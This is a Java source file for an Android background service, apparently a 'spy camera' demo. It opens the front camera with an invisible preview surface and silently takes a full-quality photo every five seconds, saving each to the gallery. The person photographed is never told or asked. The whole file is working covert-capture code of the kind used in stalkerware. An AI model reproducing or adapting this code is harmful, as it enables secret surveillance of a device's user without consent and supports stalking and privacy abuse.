package com.example.spycamerademo;

import java.io.IOException;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.media.MediaPlayer;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.MediaStore;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.Toast;

import com.example.spycamerademo.R;

public class MyService extends Service {
    public static final int DONE=1;  
    public static final int NEXT=2;
    
    //Time interval(ms) between snaps
    public static final int PERIOD=5000;   
    private Camera camera;  
    private int cameraId = 0;  
	MediaPlayer myPlayer;
	private Timer timer;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		
	}

	@Override
	public void onDestroy() {
	}

	@Override
	public void onStart(Intent intent, int startid) {

		//No Camera?
		if (!getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {  
			Toast.makeText(this, "No camera on this device", Toast.LENGTH_LONG).show();  
		} else {
			cameraId = findFrontFacingCamera(); 
			if (cameraId < 0) {
				Toast.makeText(this, "No front facing camera found.",
				Toast.LENGTH_LONG).show();
			} else {
				safeCameraOpen(cameraId);
			}
		}
		
		//Init hidden surfaceView
        SurfaceView view = new SurfaceView(this);
        SurfaceHolder surfaceHolder;
		surfaceHolder = view.getHolder();
		
        try {
        	camera.setPreviewDisplay(surfaceHolder);  
        } catch (IOException e) {  
			e.printStackTrace();  
        }
        
        camera.startPreview();  
        Camera.Parameters params = camera.getParameters();  
        params.setJpegQuality(100);  
        camera.setParameters(params);

        //Snap at a time interval
        timer=new Timer(getApplicationContext(),threadHandler);  
        timer.execute();  

	}


	//Thread Handler
	private Handler threadHandler = new Handler() {  
		public void handleMessage(android.os.Message msg) {       
			switch(msg.what){  
				case DONE:
					// Trigger camera callback to take pic        	 
					camera.takePicture(null, null, mCall);
				break;
				case NEXT:  
					timer=new Timer(getApplicationContext(),threadHandler);  
					timer.execute();  
				break;
			}
		}
		Camera.PictureCallback mCall = new Camera.PictureCallback() {
			public void onPictureTaken(byte[] data, Camera camera) {
				Bitmap bitmapPicture = BitmapFactory.decodeByteArray(data, 0, data.length);
				Message.obtain(threadHandler, MyService.NEXT, "").sendToTarget();
				MediaStore.Images.Media.insertImage(getContentResolver(), bitmapPicture, "LOL" , "LOL");
			}
		};
	};
	
	private int findFrontFacingCamera() {  
		int cameraId = -1;
		// Search for the front facing camera
		int numberOfCameras = Camera.getNumberOfCameras();
		for (int i = 0; i < numberOfCameras; i++) {
			CameraInfo info = new CameraInfo();
			Camera.getCameraInfo(i, info);
			if (info.facing == CameraInfo.CAMERA_FACING_FRONT) {
				Log.v("MyActivity", "Camera found");
				cameraId = i;
				break;
			}
		}
		return cameraId;
	}
	private boolean safeCameraOpen(int id) {  
		boolean qOpened = false;  
		try {  
			releaseCamera();  
			camera = Camera.open(id);  
			qOpened = (camera != null);  
		} catch (Exception e) {  
			Log.e(getString(R.string.app_name), "failed to open Camera");  
			e.printStackTrace();  
		}  
		return qOpened;    
	}
	private void releaseCamera() {  
		if (camera != null) {  
			camera.stopPreview();  
			camera.release();  
			camera = null;  
		}  
	}
	public class Timer extends AsyncTask<Void, Void, Void> {
		Context mContext;
		private Handler threadHandler;
		public Timer(Context context,Handler threadHandler) {
			super();
			this.threadHandler=threadHandler;
			mContext = context;
		}
		@Override
		protected Void doInBackground(Void...params) { 
			try {
				Thread.sleep(MyService.PERIOD);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			Message.obtain(threadHandler, MyService.DONE, "").sendToTarget();
			return null;
		}
	}
}